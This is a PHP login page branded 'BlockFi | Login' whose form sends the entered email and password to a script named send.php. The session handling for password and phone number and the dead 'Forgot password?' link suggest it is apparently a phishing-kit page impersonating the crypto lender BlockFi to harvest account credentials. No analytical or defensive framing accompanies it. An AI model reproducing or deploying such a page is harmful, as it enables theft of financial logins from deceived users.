<?php include_once './config.php';?>
<html lang="en">
    <?php
        unset($_SESSION['email']);
        unset($_SESSION['password']);
        unset($_SESSION['phone_number']);
    
        $title = 'BlockFi | Login';
        include_once './includes/meta.php'; 
    ?>
    <body>
        <?php include_once './includes/header.php'; ?>
        <div class='container'>
            <div class="row justify-content-center mt60 pt30">
                <div class='col-sm-4 shadow-lg p25 bg-white text-dark rounded-2'>
                    <div class='col-sm-12 text-center'>
                        <img src=<?= base_url('assets/img/logo.png') ?> width="70%" alt="Logo" class="d-inline-block align-text-top my20" />
                        <h2 class='py25 fs30 fw-medium'>Log in</h2>
                    </div>
                    <form method="post" action="<?= base_url('send.php')?>" class="">
                        <div class="form-floating my25">
                            <input name="email" type="email" required="" class="form-control form-control-lg" placeholder="Email" value="" >
                            <label for="floatingInput">Email</label>
                        </div>
                        <div class="form-floating my25">
                            <input name="password" type="password" required="" minlength="3" maxlength="50"  class="form-control form-control-lg" placeholder="password" value="" >
                            <label for="floatingInput">Password</label>
                        </div>
                        <div class="text-center mx-auto d-grid gap-2 my25">
                            <button type="submit" class="btn btn-primary-2 btn-lg btn-block rounded-0 fs16 py10">Continue</button>
                        </div>
                        <div class="row text-start">
                            <div class='col-sm-12'>
                                <a href="#" class='btn btn-link text-success text-decoration-none fw-medium' >Forgot password?</a>
                            </div>
                        </div>
                    </form>
                </div>
            </div>
        </div>
        <?php include_once './includes/footer.php'; ?>
    </body>
</html>